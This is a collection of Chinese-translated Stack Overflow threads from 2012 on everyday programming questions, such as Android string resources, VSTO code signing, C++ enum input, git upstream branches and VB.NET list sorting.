我的 strings.xml 文件中有一些我想以编程方式更改的项目，最初我是通过`setText();`调用来完成的，但现在我试图将我的应用程序翻译成另一种语言，这意味着所有内容都需要在我的字符串中设置。 xml 文件。是否可以将我的应用程序的所有文本放入 strings.xml 并通过对字符串名称的引用以编程方式更改内容，而不是使用 setText() 函数调用？例如，我将如何引用“GrandTotal”？

```
<string name="GrandTotal">Grand Total:</string>
<string name="choose_prompt">Choose a Mode</string> 
```

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-05-09T10:52:43.817

您可以使用`setText(R.string.GrandTotal);`

如果您无法`resId`直接设置文本，您可以使用[`getString(R.string.GrandTotal);`](http://developer.android.com/reference/android/content/Context.html#getString%28int%29)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-05-09T10:55:19.030

为避免 resourceIds 和真实整数之间的混淆，您还可以使用如下语句

```
String s = getResources().getString( R.string.grand_total ); 
```

但是对于大多数 ui 方法，重载通常支持直接传递 resourceIds，正如@Keyboardsurfer 所说

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-04-11T09:03:55.377

试试这个方法。我希望它对你有帮助。

```
setText(getResources().getString(R.string.GrandTotal)); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-09T11:04:28.057

在 Acriivity 中：

```
String str = getString(R.string.choose_prompt); 
```

或者

```
String str = this.getString(R.string.choose_prompt); 
```

# vsto - Unknown Publisher 仍然出现在使用 VS2010 构建的正确代码签名的 VSTO 插件上

> ID：10514576
> 
> 赞同：14
> 
> 时间：2012-05-09T10:51:10.730
> 
> 标签：vsto, add-in, oneclick

我有一个使用最新的 Verisign 代码签名证书 (PFX) 签名的 OneClick Deployed VSTO 插件。我已验证我在电话上与 Verisign 支持人员正确签署 - 他们同意。我正在使用 VS2010 构建。尽管如此，当我尝试安装时，插件显示“未知发布者”。

为什么？

如何将“Unknown Publisher”替换为 PFX 证书上的发布者名称？

这是我迄今为止为解决问题所做的工作：

1.  在 Addins 上发现[了这个关于“Unknown Publisher”问题的问题。](https://stackoverflow.com/questions/2645534/set-publisher-in-word-options-add-ins-dialog)该问题的[公认答案](https://blogs.msdn.com/b/vsto/archive/2008/06/11/specify-a-product-name-publisher-name-and-other-properties-for-vsto-solutions-saurabh-bhatia.aspx?Redirected=true)讨论了使用`mage.exe`来签署部署和应用程序清单。

2.  我曾经`mage.exe`将 PFX 签名应用于应用程序和部署清单，但无济于事；安装插件时仍然显示“未知发布者”。直到那时，我才在最后一个链接的页面上看到 MS 程序经理的评论，即 VSTO Addin 在 2008 年或更早版本下构建的不会读取应用程序或部署清单。

3.  然后我在底部看到相同的 MS 程序经理的评论链接[到此页面](https://blogs.msdn.com/b/vsto/archive/2008/06/11/specify-a-product-name-publisher-name-and-other-properties-for-vsto-solutions-saurabh-bhatia.aspx?Redirected=true)，并断言从 VS2010 开始，VSTO 插件与链接页面中指定的发布者现在将读取其清单并在插件安装时显示正确的发布者名称。

我已经完成了所有这些，但我正确代码签名的 OneClick 部署上的发布者仍然显示“未知发布者” - 为什么？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-09T14:12:54.650

跟着这些步骤：

1.  **在本地计算机上安装证书。**在 Windows 资源管理器中，右键单击证书文件，选择*安装 PFX*，然后按照说明进行操作。

2.  **确保对 VSTO 项目清单和程序集进行签名。**在 Signing 选项卡上的 VSTO 项目属性中，应选中“Sign the ClickOnce manifests”（如果没有，请选择您的 PFX 文件）。还应检查“签署程序集”并使用相同的 PFX 文件。

3.  **发布 VSTO 后，您需要从命令行对清单和已发布的 .vsto 文件进行签名。**在运行 mage.exe 之前，您还需要将 .dll 从 bin 复制到您发布的文件夹（以避免“找不到文件”错误）。为了安全起见，我强烈建议同时签署两个 .vsto。以下是执行这些步骤的命令行代码：

-

```
set AppPublishPath=bin\Release\app.publish
set AppPublishVersionPath=bin\Release\app.publish\Application Files\MyProjectName_1_0_0_0

set CertificatePath=C:\SignedCertificate.pfx
set CertificatePassword=password

copy bin\*.dll "%AppPublishVersionPath%"

mage -update "%AppPublishVersionPath%\MyProjectName.dll.manifest"  -certfile "%CertificatePath%"  -Password %CertificatePassword%
mage -update "%AppPublishVersionPath%\MyProjectName.vsto"  -appmanifest "%AppPublishVersionPath%\MyProjectName.dll.manifest" -certfile "%CertificatePath%"  -Password %CertificatePassword%
mage -update "%AppPublishPath%\MyProjectName.vsto"  -appmanifest "%AppPublishVersionPath%\MyProjectName.dll.manifest"  -certfile "%CertificatePath%"  -Password %CertificatePassword% 
```

有关可能的附加步骤，请参阅下面的 Nathan 评论。

# objective-c - 可可枚举

> ID：10514585
> 
> 赞同：0
> 
> 时间：2012-05-09T10:51:45.670
> 
> 标签：objective-c, ios, cocoa, nserror

我正在创建一个错误代码列表

```
enum{
    firstErrorCode = 1,
    secondErrorCode = 2,
}; 
```

我想为我正在编写的自定义错误类（NSObject 的子类）创建一个错误域类型概念。

有什么办法可以将此枚举与字符串名称相关联？例如 MyErrorDomain？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T11:30:13.353

没有办法将枚举与错误域名联系起来。`NSCocoaErrorDomain`如果您查看 Cocoa 错误标头（FoundationErrors.h 和 CoreDataErrors.h），您会看到编译器没有声明任何连接；这种联系全在人们的脑海中，仅在文档中表达。

您自己的错误域也是如此：您在注释和/或单独的文档中记录这些错误代码与该域一起使用，这是您可以连接它们的最大程度。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-09T10:58:32.427

我将在该类中创建一个 STATIC 函数，该函数使用简单的 switch-case 来处理这个问题。您可以询问您正在处理的类型并返回相关的 NSString。

# android - Android、多个应用程序、多个客户、一个密钥库

> ID：10514597
> 
> 赞同：5
> 
> 时间：2012-05-09T10:52:23.957
> 
> 标签：android, keystore

我有 15 个 android 应用程序要构建和托管（以及将来更新）。

每个应用程序都有一个唯一的包名称。

5 个应用程序将托管在一个 google play 帐户上。

其他 10 个将在 10 个个人客户帐户上。

我不想要应用程序之间的链接，并且希望将来能够单独更新它们。

问题：我可以为所有人使用 1 个密钥库吗？还是每个应用程序都需要一个唯一的密钥库？这会影响未来的更新过程吗？还是我只需要保持包名相同以确保成功更新？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-09T11:02:49.700

理论上，您可以使用同一个密钥库对所有应用程序进行签名。但是，在实践中，最好为每个开发人员帐户使用单独的密钥库。原因是，它们属于不同的客户，并且将来，如果其他人（不是您）必须更新应用程序，那么您将不得不向客户提供密钥库或通过使用不同的密钥库签名来更新应用程序。这两个都可能有问题。

# javascript - 使用 curl 执行 javascript 后获取源代码

> ID：10514604
> 
> 赞同：4
> 
> 时间：2012-05-09T10:52:43.223
> 
> 标签：javascript, html, curl

是否可以使用 curl 获取网页的 html 源代码并在其上运行 javascript 解释器，以便我获得生成的内容？

我需要获取的页面在其中使用了一些编码和生成的内容，所以我想首先运行 javascript 来获取转义和生成的内容......还是我需要正则表达式 javascript 并自己“编译”javascript？像

```
curl <myurl> | perl -ne 'm/unescape\((.*)\)/; print "$1"' | <now to something with that> 
```

我知道 curl 中没有 javascript 引擎，但我可以调用另一个脚本/程序来完成这项工作吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-09T11:09:29.530

你可以做到，但它比我认为你意识到的要复杂得多。既没有`curl`也`wget`没有 Javascript 引擎，所以你需要有一个的东西。

我将从查看[PhantomJS](http://phantomjs.org/)开始。

# regex - mod rewrite - 文件扩展名可能存在于 URL 中

> ID：10514607
> 
> 赞同：0
> 
> 时间：2012-05-09T10:52:44.887
> 
> 标签：regex, apache, mod-rewrite

我正在寻找重定向链接，但 .htm 可能存在或可能不存在。

我知道我可以执行以下 2，但我知道我可以在 1 中执行，只是无法使正则表达式正确。

```
RewriteRule ^page1$ http://www.example.com/newpage.htm [R=301,L]
RewriteRule ^page1\.htm$ http://www.example.com/newpage.htm [R=301,L] 
```

我将使用什么来将其保持在一行。我试过（.htm？）但从来没有工作过。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T10:58:40.417

如果您想重写以 page1 开头的任何内容，这将起作用：

```
 RewriteRule ^page1.* http://www.example.com/newpage.htm [R=301,L] 
```

如果您只想重写 page1 和 page1.htm，但不希望重写 page1whatever，这应该可以：

```
 RewriteRule ^page1(.htm)? http://www.example.com/newpage.htm [R=301,L] 
```

# mongodb - distinct 命令只给出一个选定的键值，它不提供整个文档？

> ID：10514610
> 
> 赞同：2
> 
> 时间：2012-05-09T10:52:48.630
> 
> 标签：mongodb, nosql

在 mongodb 中，当我运行命令从集合中获取不同的记录时，它只返回每条记录的键值，它不提供整个记录数据。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T14:25:05.240

从 MongoDb 的文档中：

> distinct 命令返回集合中给定键的不同值列表。

它不返回整个对象，它返回不同值的列表。[请参阅此处](http://www.mongodb.org/display/DOCS/Aggregation#Aggregation-Distinct)的文档。

如需更多信息，请提供示例并详细说明。

# matlab - VBA + Matlab：饼图麻烦

> ID：10514613
> 
> 赞同：1
> 
> 时间：2012-05-09T10:52:57.067
> 
> 标签：matlab, vba, pie-chart

我的任务是“在 excel 中创建饼图，然后在 matlab 中显示”。

我认为，我有两个麻烦：

1) 此图表是否正确创建图表？（A1-A6 是名称，B1-B6 - 数字）。

好的，这个功能起作用了。

```
Function CreateChart() As Excel.Chart
Dim title As String
title = "One"

Dim Book As Workbook
Set Book = ThisWorkbook

Dim new_sheet As Excel.Worksheet
Set new_sheet = Book.Sheets(1)

Dim new_chart As Excel.Chart
Set new_chart = Charts.Add()

ActiveChart.ChartType = xlPie

ActiveChart.SetSourceData Source:=new_sheet.Range("A1:B6"), _
      PlotBy:=xlColumns

ActiveChart.Location Where:=xlLocationAutomatic, Name:=title

With ActiveChart
    .HasTitle = True
    .ChartTitle.Characters.Text = title
End With

Set CreateChart = new_chart
End Function 
```

2）如何与这个**程序**交互（在未来 -**功能**，返回图表）

使用matlab并在matlab中绘制这个饼图？

```
 function chart = CreateChart( DataMatrix )

   pie = actxserver('Excel.Chart');
   all_pies = actxserver('Excel.Charts');
   pietype = actxserver('Excel.XlChartType');

   pie = all_pies.Add();

   pie.ChartType = pietype.xlPie;

   % here is a trouble to put data from matrix

   pie.SetSourceData Source DataMatrix              %hm.. strange

   end 
```

此代码不起作用！（我不知道如何重写字符串

`ActiveChart.SetSourceData Source:=new_sheet.Range("A1:B6"), PloBy = xlColumns` )

PS：我认为最好从excel文件加载脚本并返回图表。

但是如何在matlab中使用这个图表呢？（并画出来）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T10:56:40.967

您始终可以使用 xlsread 将 excel 值加载到 matlab，[并使用](http://www.mathworks.nl/help/techdoc/ref/xlsread.html)[pie](http://www.mathworks.nl/help/techdoc/ref/pie.html)或[pie3](http://www.mathworks.nl/help/techdoc/ref/pie3.html)在 matlab 本身中绘制饼图。

# javascript - 依次调用函数并重新加载页面

> ID：10514623
> 
> 赞同：0
> 
> 时间：2012-05-09T10:53:41.677
> 
> 标签：javascript, webkit, function-calls

我想调用一个函数，然后用javascript在webkit safari中重新加载当前页面（顺序）我该怎么做：我试过：

```
(function(){ functionCall();window.location.href = window.location.href})(); 
```

但没有工作它只会重新加载当前页面；谢谢。

# c++ - c ++枚举并使用它们从用户输入

> ID：10514626
> 
> 赞同：11
> 
> 时间：2012-05-09T10:54:06.343
> 
> 标签：c++, input, enums

我的代码中有一个枚举，如下所示`enum Status {In-Active, Active};`：状态对象作为参数传递给`Person`对象，因此我希望用户输入 Active 或 In-Active 并将它们保存在 Status 变量中。我怎样才能做到这一点？我一开始试过，但没有用。

这是我的代码：

```
#include <iostream>

using namespace std;

enum Status {InActive, Active};

class Person {
    private:
        string name;
        int age;
        Status status;

    public:
        Person (const string &_name, const int _age, const Status _status) : name(_name), age(_age), status(_status) {}

        string &getName () { return name; }
        int getAge () { return age; }
        Status getStatus () { return status; }

        void setName (const string &_name) { name = _name; }
        void setAge (const int _age) { age = _age; }
        void setStatus (const Status _status) { status = _status; }
};

////////////////////////////////////////////////////////////////////////////////
///////////////////////////////// Main Method //////////////////////////////////
////////////////////////////////////////////////////////////////////////////////

int main () {
    string name;
    int age;
    Status status;

    cout << "Enter a name: "; getline(cin, name);
    cout << "Enter age: "; cin >> age;
    cout << "Enter status: "; cin >> status;

    Person p(name, age, status);

    return 0;
} 
```

这是我得到的错误（这是构建日志）：

```
Compiling: C:\Users\KiKo-SaMa\Desktop\C++\Person.cpp
C:\Users\KiKo-SaMa\Desktop\C++\Person.cpp: In function 'int main()':
C:\Users\KiKo-SaMa\Desktop\C++\Person.cpp:36:38: error: no match for 'operator>>' in 'std::cin >> status'
C:\Users\KiKo-SaMa\Desktop\C++\Person.cpp:36:38: note: candidates are:
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:122:7: note: std::basic_istream<_CharT, _Traits>::__istream_type& std::basic_istream<_CharT, _Traits>::operator>>(std::basic_istream<_CharT, _Traits>::__istream_type& (*)(std::basic_istream<_CharT, _Traits>::__istream_type&)) [with _CharT = char, _Traits = std::char_traits<char>, std::basic_istream<_CharT, _Traits>::__istream_type = std::basic_istream<char>]
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:122:7: note:   no known conversion for argument 1 from 'Status' to 'std::basic_istream<char>::__istream_type& (*)(std::basic_istream<char>::__istream_type&) {aka std::basic_istream<char>& (*)(std::basic_istream<char>&)}'
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:126:7: note: std::basic_istream<_CharT, _Traits>::__istream_type& std::basic_istream<_CharT, _Traits>::operator>>(std::basic_istream<_CharT, _Traits>::__ios_type& (*)(std::basic_istream<_CharT, _Traits>::__ios_type&)) [with _CharT = char, _Traits = std::char_traits<char>, std::basic_istream<_CharT, _Traits>::__istream_type = std::basic_istream<char>, std::basic_istream<_CharT, _Traits>::__ios_type = std::basic_ios<char>]
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:126:7: note:   no known conversion for argument 1 from 'Status' to 'std::basic_istream<char>::__ios_type& (*)(std::basic_istream<char>::__ios_type&) {aka std::basic_ios<char>& (*)(std::basic_ios<char>&)}'
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:133:7: note: std::basic_istream<_CharT, _Traits>::__istream_type& std::basic_istream<_CharT, _Traits>::operator>>(std::ios_base& (*)(std::ios_base&)) [with _CharT = char, _Traits = std::char_traits<char>, std::basic_istream<_CharT, _Traits>::__istream_type = std::basic_istream<char>]
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:133:7: note:   no known conversion for argument 1 from 'Status' to 'std::ios_base& (*)(std::ios_base&)'
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:169:7: note: std::basic_istream<_CharT, _Traits>::__istream_type& std::basic_istream<_CharT, _Traits>::operator>>(bool&) [with _CharT = char, _Traits = std::char_traits<char>, std::basic_istream<_CharT, _Traits>::__istream_type = std::basic_istream<char>]
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:169:7: note:   no known conversion for argument 1 from 'Status' to 'bool&'
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:173:7: note: std::basic_istream<_CharT, _Traits>& std::basic_istream<_CharT, _Traits>::operator>>(short int&) [with _CharT = char, _Traits = std::char_traits<char>]
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:173:7: note:   no known conversion for argument 1 from 'Status' to 'short int&'
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:176:7: note: std::basic_istream<_CharT, _Traits>::__istream_type& std::basic_istream<_CharT, _Traits>::operator>>(short unsigned int&) [with _CharT = char, _Traits = std::char_traits<char>, std::basic_istream<_CharT, _Traits>::__istream_type = std::basic_istream<char>]
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:176:7: note:   no known conversion for argument 1 from 'Status' to 'short unsigned int&'
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:180:7: note: std::basic_istream<_CharT, _Traits>& std::basic_istream<_CharT, _Traits>::operator>>(int&) [with _CharT = char, _Traits = std::char_traits<char>]
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:180:7: note:   no known conversion for argument 1 from 'Status' to 'int&'
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:183:7: note: std::basic_istream<_CharT, _Traits>::__istream_type& std::basic_istream<_CharT, _Traits>::operator>>(unsigned int&) [with _CharT = char, _Traits = std::char_traits<char>, std::basic_istream<_CharT, _Traits>::__istream_type = std::basic_istream<char>]
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:183:7: note:   no known conversion for argument 1 from 'Status' to 'unsigned int&'
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:187:7: note: std::basic_istream<_CharT, _Traits>::__istream_type& std::basic_istream<_CharT, _Traits>::operator>>(long int&) [with _CharT = char, _Traits = std::char_traits<char>, std::basic_istream<_CharT, _Traits>::__istream_type = std::basic_istream<char>]
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:187:7: note:   no known conversion for argument 1 from 'Status' to 'long int&'
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:191:7: note: std::basic_istream<_CharT, _Traits>::__istream_type& std::basic_istream<_CharT, _Traits>::operator>>(long unsigned int&) [with _CharT = char, _Traits = std::char_traits<char>, std::basic_istream<_CharT, _Traits>::__istream_type = std::basic_istream<char>]
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:191:7: note:   no known conversion for argument 1 from 'Status' to 'long unsigned int&'
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:196:7: note: std::basic_istream<_CharT, _Traits>::__istream_type& std::basic_istream<_CharT, _Traits>::operator>>(long long int&) [with _CharT = char, _Traits = std::char_traits<char>, std::basic_istream<_CharT, _Traits>::__istream_type = std::basic_istream<char>]
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:196:7: note:   no known conversion for argument 1 from 'Status' to 'long long int&'
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:200:7: note: std::basic_istream<_CharT, _Traits>::__istream_type& std::basic_istream<_CharT, _Traits>::operator>>(long long unsigned int&) [with _CharT = char, _Traits = std::char_traits<char>, std::basic_istream<_CharT, _Traits>::__istream_type = std::basic_istream<char>]
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:200:7: note:   no known conversion for argument 1 from 'Status' to 'long long unsigned int&'
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:205:7: note: std::basic_istream<_CharT, _Traits>::__istream_type& std::basic_istream<_CharT, _Traits>::operator>>(float&) [with _CharT = char, _Traits = std::char_traits<char>, std::basic_istream<_CharT, _Traits>::__istream_type = std::basic_istream<char>]
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:205:7: note:   no known conversion for argument 1 from 'Status' to 'float&'
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:209:7: note: std::basic_istream<_CharT, _Traits>::__istream_type& std::basic_istream<_CharT, _Traits>::operator>>(double&) [with _CharT = char, _Traits = std::char_traits<char>, std::basic_istream<_CharT, _Traits>::__istream_type = std::basic_istream<char>]
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:209:7: note:   no known conversion for argument 1 from 'Status' to 'double&'
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:213:7: note: std::basic_istream<_CharT, _Traits>::__istream_type& std::basic_istream<_CharT, _Traits>::operator>>(long double&) [with _CharT = char, _Traits = std::char_traits<char>, std::basic_istream<_CharT, _Traits>::__istream_type = std::basic_istream<char>]
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:213:7: note:   no known conversion for argument 1 from 'Status' to 'long double&'
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:217:7: note: std::basic_istream<_CharT, _Traits>::__istream_type& std::basic_istream<_CharT, _Traits>::operator>>(void*&) [with _CharT = char, _Traits = std::char_traits<char>, std::basic_istream<_CharT, _Traits>::__istream_type = std::basic_istream<char>]
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:217:7: note:   no known conversion for argument 1 from 'Status' to 'void*&'
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:241:7: note: std::basic_istream<_CharT, _Traits>& std::basic_istream<_CharT, _Traits>::operator>>(std::basic_istream<_CharT, _Traits>::__streambuf_type*) [with _CharT = char, _Traits = std::char_traits<char>, std::basic_istream<_CharT, _Traits>::__streambuf_type = std::basic_streambuf<char>]
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:241:7: note:   no known conversion for argument 1 from 'Status' to 'std::basic_istream<char>::__streambuf_type* {aka std::basic_streambuf<char>*}'
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/bits/basic_string.tcc:998:5: note: template<class _CharT, class _Traits, class _Alloc> std::basic_istream<_CharT, _Traits>& std::operator>>(std::basic_istream<_CharT, _Traits>&, std::basic_string<_CharT, _Traits, _Alloc>&)
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/bits/istream.tcc:957:5: note: template<class _CharT2, class _Traits2> std::basic_istream<_CharT, _Traits>& std::operator>>(std::basic_istream<_CharT, _Traits>&, _CharT2*)
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/bits/istream.tcc:925:5: note: template<class _CharT, class _Traits> std::basic_istream<_CharT, _Traits>& std::operator>>(std::basic_istream<_CharT, _Traits>&, _CharT&)
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:709:5: note: template<class _Traits> std::basic_istream<char, _Traits>& std::operator>>(std::basic_istream<char, _Traits>&, unsigned char&)
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:714:5: note: template<class _Traits> std::basic_istream<char, _Traits>& std::operator>>(std::basic_istream<char, _Traits>&, signed char&)
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:756:5: note: template<class _Traits> std::basic_istream<char, _Traits>& std::operator>>(std::basic_istream<char, _Traits>&, unsigned char*)
c:\mingw\bin\../lib/gcc/mingw32/4.6.2/include/c++/istream:761:5: note: template<class _Traits> std::basic_istream<char, _Traits>& std::operator>>(std::basic_istream<char, _Traits>&, signed char*)
Process terminated with status 1 (0 minutes, 0 seconds)
43 errors, 0 warnings 
```

我的代码哪里出错了？谢谢

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-05-09T10:56:18.213

您不能`enum`直接读取值，您需要`std::map`将用户输入映射到`enum`值的。

```
std::map<std::string,Status> m;
m["In-Active"] = In-Active;
m["Active"] = Active;

std::string sstatus;
cin >> sstatus;
Status status = m[sstatus]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-09T11:28:58.620

*   枚举对象在编译时被解析，它只能包含**常量整数值。**

*   人 p（姓名、年龄、身份）；//这里不使用状态对象，您应该直接发送一个值，如“In-Active”或“Active”。因此，用户将没有关于状态字段的输入。

枚举状态{InActive，Active}；

*   这里的 Status 是一个枚举类，创建的任何对象都将包含值“Inactive”或“Active”。如果您尝试分配其他值，您将收到编译器错误。

状态状态；

*   这里的 status 是一个创建的枚举对象，它包含垃圾值。

cout << "进入状态："; cin >> 状态;

*   在这里，您要求用户输入对编译器完全无效的枚举对象。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-09T11:31:35.177

您还可以将枚举包装在一个类中并提供运算符>>。这是来自此链接的修改示例[http://en.wikibooks.org/wiki/More_C%2B%2B_Idioms/Type_Safe_Enum](http://en.wikibooks.org/wiki/More_C%2B%2B_Idioms/Type_Safe_Enum)

```
#include <iostream>

template<typename def>
class safe_enum : public def
{
public:
  int val;
  safe_enum(int v) : val(v) {}
//  inner underlying() const { return val; }
  bool operator == (const safe_enum & s) const { return this->val == s.val; }
  bool operator != (const safe_enum & s) const { return this->val != s.val; }
  bool operator <  (const safe_enum & s) const { return this->val <  s.val; }
  bool operator <= (const safe_enum & s) const { return this->val <= s.val; }
  bool operator >  (const safe_enum & s) const { return this->val >  s.val; }
  bool operator >= (const safe_enum & s) const { return this->val >= s.val; }
};

struct status_def {
  enum type { NoValue, InActive, Active };
};
typedef safe_enum<status_def> Status;

std::istream& operator>>(std::istream& Istr, Status& other)
{
    std::cout << "Enter Status value: " << std::endl; 
    //here the logic to handle input error
    Istr >> other.val;
    return Istr;
}

std::ostream& operator<<(std::ostream& os,const Status& toPrint)
{
    if (toPrint.val == Status::Active)
        return os << "Active";
    if (toPrint.val == Status::NoValue)
        return os << "NoValue";
    if (toPrint.val == Status::InActive)
        return os << "InActive";
    throw;
}

int main(void)
{
    Status test(Status::NoValue);
    std::cout << test << std::endl;
    std::cin >> test;
    std::cout << test << std::endl;
} 
```

# git - git pull from branch 抱怨要合并哪个分支

> ID：10514631
> 
> 赞同：1
> 
> 时间：2012-05-09T10:54:14.370
> 
> 标签：git

当我不在master分支时，git有时会抱怨

“您要求我拉动而没有告诉我要与哪个分支合并，并且配置文件中的'branch.basics.merge'也没有告诉我。请在命令行上指定您要使用的分支并尝试再次（例如'git pull'）。有关详细信息，请参阅 git-pull(1)。

只是想知道是否可以配置 git，使其始终与来自源的关联远程分支合并。举个例子：如果我在分支基础（我现在是;-)）并且我做了一个 git pull。现在我想让 git 从原点获取这个分支并将它与同一个本地分支合并。

干杯，鲁道夫

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-09T10:57:04.780

您可以指定上游分支（请参阅“[如何使现有的 git 分支跟踪远程分支？](https://stackoverflow.com/questions/520650/how-do-you-make-an-existing-git-branch-track-a-remote-branch) ”）：

```
git branch --set-upstream basics origin/basics 
```

或者，第一次推送分支时（请参阅“ [Git：为什么我需要一直这样做`--set-upstream`？](https://stackoverflow.com/questions/6089294/git-why-do-i-need-to-do-set-upstream-all-the-time) ”）：

```
git push -u origin my_branch 
```

# android - 膨胀后子视图为空

> ID：10514637
> 
> 赞同：2
> 
> 时间：2012-05-09T10:54:27.623
> 
> 标签：android, android-layout

好的，所以我这样做（不是实际代码）

```
try {
    final View view = LayoutInflater.from(context).inflate(R.layout.ownComponent, null);
} catch (InflateExpection e) {
}

if (view != null) {
    // This child is null about 5/10 times!

    View child = view.findViewById(R.id.ownComponentChild);
} 
```

我读到在膨胀之后不能保证子视图被膨胀，那么当所有孩子都准备好时，什么是获得回调的好方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T11:05:47.680

也许我误解了你想要做什么，但看起来你正在膨胀`View`而不是布局......

尝试

```
View view = LayoutInflater.from(context).inflate(R.layout.LAYOUT_THAT_HOLDS_ownComponent, this, true); 
```

然后 view 将保存整个布局，您可以从中通过 Id 找到孩子

```
view.findViewById(...); 
```

**编辑：**

很难知道它是否相关，因为您没有发布足够的代码，但试试这个：`View view`摆脱 try/catch 并将其作为类成员。松开决赛并投下孩子。

示例（假设 ownComponentChild 是 FrameLayout）：

`FrameLayout child = (FrameLayout)view.findViewById(R.id.ownComponentChild);`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T04:41:09.430

这似乎是随机发生的，所以我唯一的猜测是在这种情况下内存变低了，因为我必须快速重新创建这么多 UI 组件才能重现它。

# vb.net - 使用 findAll 然后在 vb.NET listOf 中排序

> ID：10514642
> 
> 赞同：3
> 
> 时间：2012-05-09T10:54:43.993
> 
> 标签：vb.net, generic-list, lambda

我正在尝试使用函数 findAll 加上一个 lambda 函数来获取 listOf 结构的特定元素，然后对该结果进行排序并将这些元素的排序保存在列表中。listOf 的结构有一个 id 和一个年龄，所以我想要的是获取所有 id=0 的项目，然后对该结果的年龄进行排序，将修改保留在变量中。

这是我尝试过的，但它不起作用

```
list.FindAll(Function(p1) p1.id = 0).Sort(Function(p1, p2) p1.age > p2.age) 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-09T11:35:23.160

您的代码行不起作用，因为 FindAll 返回一个包含找到的项目的新列表，并且您没有将该新列表分配给 list 变量。此外，您不能链接对 Sort 的调用，因为此函数会更改基础列表并且不返回任何内容。要同时使用 FindAll 和 Sort，您需要两个语句：

```
list = list.FindAll(Function(p1) p1.id = 0)
list.Sort(Function(p1, p2) p1.age.CompareTo(p2.age)) 
```

使用 Linq 会更容易执行此操作，因为您始终可以使用 Linq 链接表达式，并且排序更容易进行。但是您需要再次将结果分配给列表：

```
list = list.Where(Function(p1) p1.id = 0) _
           .OrderBy(Function(p1) p1.Age).ToList() 
```

# javascript - javascript 匿名函数语法变体

> ID：10514644
> 
> 赞同：3
> 
> 时间：2012-05-09T10:54:53.410
> 
> 标签：javascript, syntax, anonymous-function

> **可能重复：**
> [自动执行匿名 JavaScript 函数的括号位置？](https://stackoverflow.com/questions/3384504/location-of-parenthesis-for-auto-executing-anonymous-javascript-functions)
> [“(function ( ) { } ) ( )” 和 “(function ( ) { } ( ) )” 在 JavaScript 中的功能是否相同？](https://stackoverflow.com/questions/5938802/are-function-and-function-functionally-equal-i)

我已经看到 javascript 匿名函数以两种不同的方式编写：

```
(function(){

})(); 
```

和

```
(function(){

}()); 
```

我一直认为上面的是正确的，直到现在还没有遇到过下面的。我认为这可能根本没有区别，但我认为我应该确定。两者之间有什么区别还是两种方式都等效？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-09T10:55:57.107

它们是等价的。

左括号很重要——它帮助解析器弄清楚接下来是*函数表达式*而不是*函数声明*。

